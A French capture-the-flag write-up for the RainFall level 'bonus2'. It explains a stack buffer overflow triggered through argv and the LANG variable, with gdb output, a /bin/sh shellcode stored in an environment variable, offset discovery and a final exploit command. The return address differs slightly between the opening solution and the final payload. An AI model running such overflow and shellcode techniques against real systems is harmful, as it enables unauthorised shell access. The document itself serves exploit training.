# Soluce

```
cat - | ./bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("A" * 23 + "\x25\xf3\xff\xbf" + "A" * 30)') 
```

## Description du code

Main :

-   une variable global language est declarer est est initialiser de base a 0
-   3 buffer son declarer dest et v4 d'une taille de 76, v6 d'une taille non defini
-   dest est remplie de zero
-   les 40 premier charactere de argv[1] son copier dans dest
-   les 32 premier charactere de argv[2] son concatener dans dest
-   La veleur de la variable d'environnment LANG est assignet a v6
-   Si v6 est egale a fi, la valeur de language est 1 
-   Si v6 est egale a nl, la valeur de language est 2
-   dest est copier dans v4

-   la fonction greetuser est appeler en lui passant v4 comme argument

GreetUser :

-   3 variable son declarer seulement dest est importante
-   si langage est egale a 1 "Hyvää päivää " est copier dans dest
-   si elle est egale a 2 "Goedemiddag! " est copier dans dest
-   si elle est egale a 3 "Hello " est copier dans dest
-   dest est src son concatener grace a strcat

## Explication 

On va pouvoir faire overflow le dest de la fonction getuser, et atteindre l'adresse de retour pour executer un shellcode, cependant on devra export une variable d'environemment "LANG" il faudra qu'elle est pour valeur "nl" ou "fi". L'idee est que comme argv[1] et argv[2] sont copier dans dest,et si l'on export "nl" dans LANG, la string "Goedemiddag! " sera elle aussi copier dans dest, si l'on met rien dans LANG seulement 2 octet de l'adresse de retour serons overwrite, mais avec "nl" ou "fi dest sera suffisament grande pour overwrite la totalite de l'adresse de retour.

### Pour "fi"
```
bonus2@RainFall:~$ export LANG="fi"
bonus2@RainFall:~$ gdb ./bonus2 

(gdb) run $(python -c 'print("A" * 40)') $(python -c 'print("B" * 40)')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("B" * 40)')

Single stepping until exit from function main,
which has no line number information.
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

### Pour ""

```
bonus2@RainFall:~$ export LANG=""
bonus2@RainFall:~$ gdb ./bonus2 
(gdb) run $(python -c 'print("A" * 40)') $(python -c 'print("B" * 40)')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("B" * 40)')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()
```

### Pour "nl"

```
bonus2@RainFall:~$ export LANG="nl"
bonus2@RainFall:~$ gdb ./bonus2 
(gdb) run $(python -c 'print("A" * 40)') $(python -c 'print("B" * 40)')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("B" * 40)')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info r 
(...)
eip            0x42424242       0x42424242
(...)
```

### Payload

Maintenant que l'on sait, que l'adresse de retour est ecrasé, il nous suffit d'obtenir l'offset est d'y mettre un shellcode :

```
bonus2@RainFall:~$ export LANG="nl"
```
----------------------------------------------------------------
#### Shellcode
----------------------------------------------------------------
```
export SHELLCODE=$(python -c 'print("\x90" * 2000 + "1\xc0\xb0\xbe\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80")')

bonus2@RainFall:~$ gdb ./bonus2 
(gdb) b main
Breakpoint 1 at 0x804852f
(gdb) run 
Starting program: /home/user/bonus2/bonus2 

Breakpoint 1, 0x0804852f in main ()
(gdb) call (char *) getenv("SHELLCODE")
$1 = 0xbffff132 "\220\220\220\220\220\220\220\220\220"...
```
0xbffff132 + 500 (pour atterir dans le nop sled) = 0xbffff326

----------------------------------------------------------------
#### Offset
----------------------------------------------------------------
(gdb) run $(python -c 'print("A" * 40)') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab
5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 $(python -c 'print("A" * 40)') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Breakpoint 1, 0x0804852f in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? ()
(...)
eip            0x38614137       0x38614137
(...)

38614137 -> 8aA7 -> 7Aa8 -> 23

----------------------------------------------------------------
##### Final Payload
----------------------------------------------------------------
(Argv[1] = [Padding de 40]) (Argv[2] = [Padding de 23] + [Adress du shellcode] + [Padding pour overflow])

cat - | ./bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("A" * 23 + "\x26\xf3\xff\xbf" + "A" * 30)') 